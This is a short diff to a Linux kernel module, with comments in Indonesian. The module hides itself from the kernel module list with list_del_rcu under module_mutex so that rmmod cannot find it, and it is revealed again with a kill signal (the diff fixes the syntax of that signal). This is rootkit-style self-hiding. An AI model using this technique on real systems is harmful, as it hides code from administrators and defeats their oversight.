@@ -10,7 +10,7 @@
  *     mutex_lock(&module_mutex) -> list_del_rcu(&THIS_MODULE->list) -> unlock
  *
  * KONTRAK: set disembunyikan, rmmod TIDAK menemukan modul ini —
- * sebelum unload: kill -s651 (tampilkan lagi) atau reboot.
+ * sebelum unload: kill -s62 1 (tampilkan lagi) atau reboot.
  * v1 jujur: /sys/module/<nama> masih terlihat.
  *
  * Catatan: module_mutex & modules adalah symbol STATIK — butuh
@@ -63,7 +63,7 @@ int l4x_modhide_hide(void)
 	mutex_unlock(g_module_mutex);
 
 	g_hidden = true;
-	pr_info("l4x: modul disembunyikan (kill -s651 untuk tampilkan / rmmod!)\n");
+	pr_info("l4x: modul disembunyikan (kill -s62 1 untuk tampilkan / rmmod!)\n");
 	return 0;
 }
 
